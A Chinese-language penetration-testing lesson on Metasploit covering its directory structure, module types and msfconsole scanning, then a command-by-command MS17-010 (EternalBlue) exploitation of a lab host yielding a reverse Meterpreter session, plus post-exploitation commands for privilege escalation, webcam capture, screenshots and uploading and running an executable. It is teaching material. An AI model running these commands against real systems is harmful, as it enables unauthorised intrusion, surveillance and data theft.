#  050：Metasploit渗透基础及实操 🔧

![](img/6bea3ceee54c62aef97063025f7c581f_0.png)

在本节课中，我们将要学习渗透测试框架Metasploit的基础知识，包括其目录结构、核心模块、基本操作流程，并通过经典的MS17-010（永恒之蓝）漏洞攻击实例，演示如何利用Metasploit获取目标主机的Meterpreter会话，并进行初步的后渗透操作。

---

## 概述 📖

![](img/6bea3ceee54c62aef97063025f7c581f_2.png)

![](img/6bea3ceee54c62aef97063025f7c581f_3.png)

Metasploit是一个高度模块化的开源渗透测试框架，它集成了大量已知漏洞的利用脚本（Exploit）、攻击载荷（Payload）以及辅助工具。使用Metasploit，测试者可以自动化执行复杂的攻击流程，例如漏洞扫描、利用、权限提升和持久化控制，而无需深入理解每个漏洞的底层细节或手动编写利用代码。本节课旨在帮助初学者理解Metasploit的基本架构和使用方法。

---

![](img/6bea3ceee54c62aef97063025f7c581f_5.png)

![](img/6bea3ceee54c62aef97063025f7c581f_7.png)

## Metasploit简介与安装 🛠️

Metasploit（简称MSF）是最受欢迎的渗透测试工具之一。在Kali Linux中通常预装，其安装路径一般为 `/usr/share/metasploit-framework/`。

![](img/6bea3ceee54c62aef97063025f7c581f_9.png)

**查看版本与更新：**
```bash
msfconsole -v
```
若需更新，可先更新APT源，然后执行安装命令：
```bash
apt-get update
apt-get install metasploit-framework
```
也可以从GitHub官方仓库单独下载更新的模块文件，放入对应的 `modules` 目录。

![](img/6bea3ceee54c62aef97063025f7c581f_11.png)

![](img/6bea3ceee54c62aef97063025f7c581f_13.png)

![](img/6bea3ceee54c62aef97063025f7c581f_15.png)

---

![](img/6bea3ceee54c62aef97063025f7c581f_17.png)

![](img/6bea3ceee54c62aef97063025f7c581f_19.png)

## 目录结构解析 📁

![](img/6bea3ceee54c62aef97063025f7c581f_21.png)

![](img/6bea3ceee54c62aef97063025f7c581f_23.png)

了解Metasploit的目录结构有助于我们更好地使用它。核心目录如下：

![](img/6bea3ceee54c62aef97063025f7c581f_25.png)

以下是各主要目录及其功能的简要说明：

![](img/6bea3ceee54c62aef97063025f7c581f_27.png)

![](img/6bea3ceee54c62aef97063025f7c581f_29.png)

*   **data**: 存储二进制文件、可编辑文件等数据。
*   **documentation**: 存放框架的文档。
*   **lib**: 核心库文件。
*   **plugins**: 插件目录。
*   **scripts**: 脚本目录。
*   **tools**: 包含各种独立工具。
*   **modules**: **最重要的目录**，包含所有功能模块。

---

![](img/6bea3ceee54c62aef97063025f7c581f_31.png)

### 核心模块目录（modules）

![](img/6bea3ceee54c62aef97063025f7c581f_33.png)

![](img/6bea3ceee54c62aef97063025f7c581f_35.png)

`modules` 目录下包含七个子目录，分别对应不同的功能：

![](img/6bea3ceee54c62aef97063025f7c581f_37.png)

以下是各模块类型的详细说明：

*   **auxiliary（辅助模块）**: 用于信息收集、漏洞扫描、密码爆破等辅助性任务。
*   **exploits（漏洞利用模块）**: 包含针对各种系统和应用漏洞的利用脚本。
*   **payloads（攻击载荷模块）**: 定义攻击成功后希望在目标系统执行的代码，如反弹Shell。
*   **post（后渗透模块）**: 在获取目标系统访问权限后，用于进行权限提升、内网探测、信息搜集等后续操作。
*   **encoders（编码器模块）**: 对Payload进行编码，以绕过杀毒软件（AV）或入侵检测系统（IDS）的检测。
*   **nops（空指令模块）**: 生成空指令（NOP sled），用于提高漏洞利用的稳定性。
*   **evasion（规避模块）**: 生成免杀（Antivirus Evasion）的Payload。

![](img/6bea3ceee54c62aef97063025f7c581f_39.png)

---

![](img/6bea3ceee54c62aef97063025f7c581f_41.png)

## 启动与基础操作 ⚙️

上一节我们介绍了Metasploit的目录结构，本节中我们来看看如何启动它并进行基础操作。

![](img/6bea3ceee54c62aef97063025f7c581f_43.png)

**启动与数据库初始化：**
```bash
# 初始化数据库（可选，但便于保存扫描结果）
msfdb init
# 启动MSF控制台
msfconsole
```
启动后，可以使用 `db_status` 命令检查数据库连接，使用 `workspace` 命令管理工作区。

**信息收集示例：**
在MSFconsole中，可以直接使用集成的Nmap进行扫描，结果会自动存入数据库。
```bash
db_nmap -sS 192.168.1.0/24
```
也可以使用辅助模块进行扫描，例如使用SYN半开扫描：
```bash
use auxiliary/scanner/portscan/syn
show options
set RHOSTS 192.168.1.100
set THREADS 20
run
```

![](img/6bea3ceee54c62aef97063025f7c581f_45.png)

---

![](img/6bea3ceee54c62aef97063025f7c581f_47.png)

![](img/6bea3ceee54c62aef97063025f7c581f_49.png)

![](img/6bea3ceee54c62aef97063025f7c581f_51.png)

## 实战：利用MS17-010漏洞攻击 🎯

我们以经典的“永恒之蓝”（MS17-010）漏洞为例，演示完整的Metasploit攻击流程。

![](img/6bea3ceee54c62aef97063025f7c581f_53.png)

**第一步：搜索并检测漏洞**
```bash
search ms17-010
use auxiliary/scanner/smb/smb_ms17_010
set RHOSTS 192.168.2.131
run
```
如果目标存在漏洞，模块会提示 `Host is likely VULNERABLE to MS17-010!`。

![](img/6bea3ceee54c62aef97063025f7c581f_55.png)

![](img/6bea3ceee54c62aef97063025f7c581f_57.png)

**第二步：选择利用模块并设置参数**
```bash
use exploit/windows/smb/ms17_010_eternalblue
show options
# 设置目标IP
set RHOST 192.168.2.131
# 设置监听IP（攻击机IP）和端口
set LHOST 192.168.2.128
set LPORT 4444
```
**第三步：执行攻击**
```bash
exploit
```
攻击成功后，会得到一个 **Meterpreter** 会话。Meterpreter是一个功能强大的后渗透工具。

![](img/6bea3ceee54c62aef97063025f7c581f_59.png)

![](img/6bea3ceee54c62aef97063025f7c581f_61.png)

![](img/6bea3ceee54c62aef97063025f7c581f_63.png)

---

![](img/6bea3ceee54c62aef97063025f7c581f_65.png)

## Meterpreter后渗透基础 🕵️♂️

成功获取Meterpreter会话是渗透测试的关键一步。在Meterpreter中，输入 `?` 或 `help` 可以查看所有可用命令。

![](img/6bea3ceee54c62aef97063025f7c581f_67.png)

**常用Meterpreter命令分类：**

![](img/6bea3ceee54c62aef97063025f7c581f_69.png)

![](img/6bea3ceee54c62aef97063025f7c581f_71.png)

以下是部分核心功能的命令示例：

![](img/6bea3ceee54c62aef97063025f7c581f_73.png)

![](img/6bea3ceee54c62aef97063025f7c581f_75.png)

*   **会话管理**: `background`（会话放到后台）， `sessions -i <ID>`（重新进入会话）。
*   **系统命令**: `sysinfo`（查看系统信息）， `getuid`（查看当前用户权限）。
*   **文件系统**: `ls`, `cd`, `download`, `upload`。
*   **权限提升**: `getsystem`。
*   **网络命令**: `ipconfig`, `portfwd`（端口转发）。
*   **摄像头/截屏**: `webcam_list`, `webcam_snap`, `screenshot`。
*   **获取Shell**: `shell`（进入目标系统的CMD）。

**示例：文件上传与执行**
```bash
# 将本地文件上传到目标C盘
upload /path/to/local/exp.exe C:\\
# 进入目标系统的Shell
shell
# 在Shell中执行上传的程序
C:\\exp.exe
```

![](img/6bea3ceee54c62aef97063025f7c581f_77.png)

---

## 总结 📝

![](img/6bea3ceee54c62aef97063025f7c581f_79.png)

![](img/6bea3ceee54c62aef97063025f7c581f_81.png)

本节课中我们一起学习了Metasploit渗透测试框架的基础知识。我们从框架的简介和目录结构开始，了解了其核心模块的组成。随后，我们学习了如何启动MSFconsole并进行基本的信息收集操作。最后，通过一个完整的MS17-010漏洞攻击实例，我们实践了从漏洞扫描、利用到获取Meterpreter会话，并进行简单后渗透操作的完整流程。

![](img/6bea3ceee54c62aef97063025f7c581f_83.png)

![](img/6bea3ceee54c62aef97063025f7c581f_85.png)

记住，Metasploit功能极其丰富，本节课仅触及冰山一角。要熟练掌握，必须勤加练习，在实际操作中遇到问题并解决，才能真正提升技能。课后请务必在实验环境中复现整个流程，并尝试探索Meterpreter的更多功能。